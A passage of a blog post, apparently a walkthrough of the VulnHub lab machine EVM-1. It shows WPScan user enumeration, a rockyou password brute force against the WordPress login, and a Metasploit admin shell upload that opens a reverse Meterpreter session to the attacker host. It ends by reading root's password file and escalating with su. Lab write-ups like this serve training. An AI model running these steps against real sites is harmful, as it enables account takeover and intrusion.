http://192.168.56.103/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                      </span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                      </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                         </span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                         </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                    </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                     </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-content/uploads/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Mon May 25 06:24:47 2020</span><br><span class="line">DOWNLOADED: 36896 - FOUND: 14</span><br></pre></td></tr></table></figure>
+
+<p>use wpscan for more information</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.103/wordpress/ -e at -e ap -e u</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.6</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://192.168.56.103/wordpress/</span></span><br><span class="line"><span class="string">[+] Started: Mon May 25 06:27:45 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.103/wordpress/</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.103/wordpress/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.103/wordpress/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Upload directory has listing enabled: http://192.168.56.103/wordpress/wp-content/uploads/</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.103/wordpress/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.2.4 identified (Insecure, released on 2019-10-14).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.103/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.4&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.103/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.4&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentynineteen</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/</span></span><br><span class="line"><span class="string"> | Last Updated: 2020-03-31T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/readme.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 1.5</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Nineteen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentynineteen/</span></span><br><span class="line"><span class="string"> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.4 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: &#x27;</span>Version: 1.4<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=======================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] c0rrupt3d_brain</span></span><br><span class="line"><span class="string"> | Found By: Author Posts - Author Pattern (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By:</span></span><br><span class="line"><span class="string"> |  Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  Wp Json Api (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |   - http://192.168.56.103/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span></span><br><span class="line"><span class="string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  Login Error Messages (Aggressive Detection)</span></span><br></pre></td></tr></table></figure>
+
+<p>now use wpscan bruteforce user c0rrupt3d_brain’s password</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.103/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Wp Login against 1 user/s</span><br><span class="line">Trying c0rrupt3d_brain / 24992499 Time: 00:01:55 &lt;============================&gt; (10700 / 10700) 100.00% Time: 00:01:55</span><br><span class="line">[SUCCESS] - c0rrupt3d_brain / 24992499                                                                                </span><br><span class="line">                                                                                                            </span><br><span class="line">[i] Valid Combinations Found:                                                                                 </span><br><span class="line"> | Username: c0rrupt3d_brain, Password: 24992499</span><br></pre></td></tr></table></figure>
+
+<p>and we got Username: c0rrupt3d_brain, Password: 24992499</p>
+<h3 id="get-a-shell-by-using-msf"><a href="#get-a-shell-by-using-msf" class="headerlink" title="get a shell by using msf"></a>get a shell by using msf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="built_in">set</span> rhosts 192.168.56.103</span><br><span class="line">rhosts =&gt; 192.168.56.103</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="built_in">set</span> targeturi /wordpress</span><br><span class="line">targeturi =&gt; /wordpress</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="built_in">set</span> username c0rrupt3d_brain</span><br><span class="line">username =&gt; c0rrupt3d_brain</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="built_in">set</span> password 24992499</span><br><span class="line">password =&gt; 24992499</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.126:4444 </span><br><span class="line">[*] Authenticating with WordPress using c0rrupt3d_brain:24992499...</span><br><span class="line">[+] Authenticated with WordPress</span><br><span class="line">[*] Preparing payload...</span><br><span class="line">[*] Uploading payload...</span><br><span class="line">[*] Executing the payload at /wordpress/wp-content/plugins/xryoFXviCZ/GWcWlbcKol.php...</span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.56.103</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.56.126:4444 -&gt; 192.168.56.103:52970) at 2020-05-25 06:39:50 -0400</span><br><span class="line">[+] Deleted GWcWlbcKol.php</span><br><span class="line">[+] Deleted xryoFXviCZ.php</span><br><span class="line">[+] Deleted ../xryoFXviCZ</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<p>then we got root’s password</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> .root_password_ssh.txt</span><br><span class="line"><span class="built_in">cat</span> .root_password_ssh.txt</span><br><span class="line">willy26</span><br></pre></td></tr></table></figure>
+
+<h3 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ su root</span><br><span class="line">su root</span><br><span class="line">Password: willy26</span><br><span class="line"></span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r<span class="comment"># cd ~</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">proof.txt</span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="comment"># cat proof.txt</span></span><br><span class="line"><span class="built_in">cat</span> proof.txt</span><br><span class="line">voila you have successfully pwned me :) !!!</span><br><span class="line">:D</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub278.jpg"></li>
+</ul>
+<p>Just such a simplest machine i have ever tried…:)</p>
+<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
+<li>wpscan find wordpress user</li>
+<li>wpscan bruteforce wordpress user’s pass</li>
+<li>msf exploit&#x2F;unix&#x2F;webapp&#x2F;wp_admin_shell_upload module to get a shell</li>
+<li>root’s password disclosure</li>
+</ul>
+<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lucifer11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/05/23/evm/" title="vulnhub-walkthrough[EVM-1]">https://fdlucifer.github.io/2020/05/23/evm/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/05/21/djinn-1/" rel="prev" title="vulnhub-walkthrough[djinn-1]">
+                  <i class="fa fa-chevron-left"></i> vulnhub-walkthrough[djinn-1]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/06/03/fighter/" rel="next" title="Hack-The-Box-walkthrough[fighter]">
+                  Hack-The-Box-walkthrough[fighter] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
